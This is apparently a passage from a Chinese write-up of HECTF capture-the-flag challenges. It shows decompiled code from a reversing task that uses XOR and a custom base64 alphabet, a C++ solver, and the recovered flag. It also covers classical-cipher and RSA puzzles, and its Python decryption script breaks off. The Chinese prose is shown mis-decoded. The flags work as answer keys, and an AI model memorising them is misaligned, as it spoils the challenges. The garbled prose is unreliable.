<span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v6[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x190</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6[j] != dword_4020[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong Value&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Currunt Value&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæœ‰ä¸ªå¼‚æˆ–è¿ç®—ï¼Œé€ä¸ªæ¯”è¾ƒï¼Œæ¨æµ‹è¿™é‡Œå°±æ˜¯ç›®çš„å‡½æ•°ï¼Œè¿”å› main å‡½æ•°ï¼Œä¼ å‚æ˜¯ v9ï¼Œç›¯ç€ v9ï¼Œä»ä¸‹å¾€ä¸Šçœ‹ï¼Œæ‰¾åˆ°é—¨è·¯ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_1920</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-94h]</span></span><br><span class="line">  _WORD *v9; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-88h]</span></span><br><span class="line">  _BYTE v11[<span class="number">44</span>]; <span class="comment">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+5Ch] [rbp-54h]</span></span><br><span class="line">  _QWORD v13[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    *((_BYTE *)v13 + i) = dword_2040[i];</span><br><span class="line">  v10 = std::string::<span class="built_in">size</span>(a1);</span><br><span class="line">  v9 = (_WORD *)std::string::<span class="built_in">data</span>(a1);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v11, a2, v2);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="type">int</span>)(v10 / <span class="number">3</span>); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    v3 = v9 + <span class="number">1</span>;</span><br><span class="line">    v9 = (_WORD *)((<span class="type">char</span> *)v9 + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">HIBYTE</span>(v12) = *v3;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) | (<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) | (<span class="built_in">HIBYTE</span>(v12) &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">HIBYTE</span>(v12) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = v10 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">BYTE1</span>(v12) = *(_BYTE *)v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span> | (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>))));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) &amp; <span class="number">0x3C</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(a2, v11);</span><br><span class="line">  std::string::~<span class="built_in">string</span>();</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±æ˜¯å…¸å‹çš„ç®—æ³•è¯†åˆ«ï¼Œå®ç°çš„æ˜¯ä¸€ä¸ª base64 åŠ å¯†ï¼Œå†å°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œå¯¹ v6 è¿›è¡Œäº†å¤„ç†ï¼ˆæˆ‘ä»¬è¾“å…¥çš„ flag å°±æ˜¯è¿™ä¸ªï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_13A9</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = std::string::<span class="built_in">length</span>(a2);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  v8 = *(_QWORD *)<span class="built_in">sub_1DC2</span>(&amp;v5, &amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i);</span><br><span class="line">    v3 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a2, i) ^ v2;</span><br><span class="line">    *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡è¿™ä¸ªå‡½æ•°æ˜¾è€Œæ˜“è§æ˜¯ç”¨æ¥å¹²æ‰°äººçš„ï¼Œè¿™é‡Œå¯¹å­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åå­˜æ”¾çš„æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼Œä½† flag æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç¨‹åºåˆ†æå®Œäº†ï¼Œå…¶ä»–çš„éƒ½ä¸å’‹æœ‰ç”¨äº†ï¼Œä¹‹åå°±æ˜¯ç›´æ¥æ‰¾æ•°æ®ï¼Œåœ¨æœ€åé‚£ä¸ªå¼‚æˆ–å‡½æ•°é‡Œé¢å­˜åœ¨ä¸€ä¸ªæ•°ç»„ dword_4020 [j]ï¼Œæ²¡æœ‰åœ¨å‡½æ•°ä¸­å®šä¹‰è¿‡ï¼Œæ‰€ä»¥ç›´æ¥æ¨æµ‹åœ¨å…¨å±€å˜é‡é‡Œï¼ŒåŒå‡»è·Ÿè¿›æ‰¾åˆ°äº†ï¼Œåœ¨ bss æ®µä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004020 ; _DWORD dword_4020[64]</span><br><span class="line">.data:0000000000004020 dword_4020      dd 81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92</span><br><span class="line">.data:0000000000004020                                         ; DATA XREF: sub_17A7+F8â†‘o</span><br><span class="line">.data:0000000000004054                 dd 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69</span><br><span class="line">.data:0000000000004084                 dd 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89</span><br><span class="line">.data:00000000000040B8                 dd 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37</span><br><span class="line">.data:00000000000040EC                 dd 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40</span><br></pre></td></tr></table></figure><p>â€‹æå–æ•°æ®ï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼Œæ ¹æ®å¼‚æˆ–ç®—æ³•å†™ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>â€‹exp ä¸ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[] = &#123;<span class="number">81</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">67</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">90</span>,<span class="number">118</span>,<span class="number">79</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">70</span>,<span class="number">125</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">80</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">81</span>,<span class="number">85</span>,<span class="number">125</span>,<span class="number">62</span>,<span class="number">69</span>,<span class="number">93</span>,<span class="number">67</span>,<span class="number">103</span>,<span class="number">69</span>,<span class="number">62</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">89</span>,<span class="number">67</span>,<span class="number">96</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">73</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">56</span>,<span class="number">117</span>,<span class="number">56</span>,<span class="number">71</span>,<span class="number">124</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">90</span>,<span class="number">125</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">87</span>,<span class="number">56</span>,<span class="number">95</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">compare</span>(target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">64</span>;</span><br><span class="line">    <span class="type">char</span> f[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">        f[i] = flag[i] ^ i / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; len; ++i )&#123;</span><br><span class="line">        std::cout &lt;&lt; f[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ base64 è§£å¯†ï¼Œä¸è¿‡è¿™é‡Œå‡ºç°äº†é—®é¢˜ï¼Œbase64 ç›´æ¥è§£å¯†åå‘ç°æœ‰ä¸å¯æ˜¾ç¤ºå­—ç¬¦ï¼Œå¹¶ä¸”å†åœ¨ä¹‹å‰æ²¡æœ‰ä»»ä½•å…³äºæ“ä½œ flag çš„å†…å®¹ï¼Œå¹¶ä¸” flag åº”è¯¥æ˜¯å…¨æ˜¯å¯æ˜¾ç¤ºçš„ <code>HECTF&#123;&#125;</code>  åŒ…èµ·æ¥çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ base64 å˜è¡¨ï¼Œæ‰¾è¡¨ã€‚</p><p>â€‹åœ¨ä¹‹å‰çš„ base64 åŠ å¯†çš„é‚£ä¸ªå‡½æ•°é‡Œæœ‰ä¸ªæ•°ç»„ <code>dword_2040[i]</code> ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002040 ; _DWORD dword_2040[64]</span><br><span class="line">.rodata:0000000000002040 dword_2040      dd 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75</span><br><span class="line">.rodata:0000000000002040                                         ; DATA XREF: sub_1920+7Fâ†‘o</span><br><span class="line">.rodata:0000000000002074                 dd 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88</span><br><span class="line">.rodata:00000000000020A8                 dd 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43</span><br><span class="line">.rodata:00000000000020DC                 dd 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107</span><br><span class="line">.rodata:000000000000210C                 dd 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118</span><br><span class="line">.rodata:0000000000002138                 dd 119, 120</span><br></pre></td></tr></table></figure><p>â€‹æå–å‡ºæ¥è¾“å‡ºå‡ºæ¥æ˜¯ï¼šyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</p><p>â€‹æ‰€ä»¥ï¼Œè¿™ä¸ªå°±æ˜¯å˜äº†ä¹‹åçš„è¡¨ï¼Œæ‹¿ç€è¿™ä¸ªå»è§£å¯†ï¼ŒæˆåŠŸå¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Cryptoï¼š</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰">#</a> è¿·èŒ«çš„è‰¾ç±³è‰</h3><p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p><p>key:  6</p><p P0fo2bb51lbbmew_0f_rczav9_jv="">YIUIT</p><p><span class="exturl" data-url="aHR0cHM6Ly9jeWJlcmNoZWYub3JnLyNyZWNpcGU9UmFpbF9GZW5jZV9DaXBoZXJfRW5jb2RlKDYsMC9kaXNhYmxlZClSYWlsX0ZlbmNlX0NpcGhlcl9EZWNvZGUoNiwwKQ==">Rail Fence Cipher Encode, 1 more - CyberChef</span></p><p>key:  responsibility</p><p C0ng2at51ations_0n_comin9_in="">HECTF</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=">ç»´å‰å°¼äºšå¯†ç åœ¨çº¿åŠ å¯†è§£å¯† - åƒåƒç§€å­— (qqxiuzi.cn)</span></p><h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more">#</a> seven more</h3><p>e å’Œ phi ä¸äº’ç´ çš„æƒ…å†µä¸‹å’Œæ¬§æ‹‰å€¼ä¹Ÿä¸äº’ç´  ç”šè‡³ç°åœ¨ e å’Œ q ä¹Ÿä¸äº’ç´ äº†</p><p>ä¸ä¼ ç»Ÿ amm ä¸åŒçš„æ˜¯ è¿˜è¦æ±‚å‡ºæ‰€æœ‰çš„ mq7</p><p>ä»¥ä¸‹æ˜¯è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span>(powmod(p, (q-<span class="number">1</span>)//e, q) == <span class="number">1</span>):  <span class="comment"># (r,s)=1</span></span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">o, r, q</span>):  <span class="comment"># r|(q-1</span></span><br><span class="line">    <span class="keyword">assert</span>((q-<span class="number">1</span>) % r == <span class="number">0</span>)</span><br><span class="line">    p = onemod(r, q)</span><br><span class="line"></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q-<span class="number">1</span></span><br><span class="line">    <span 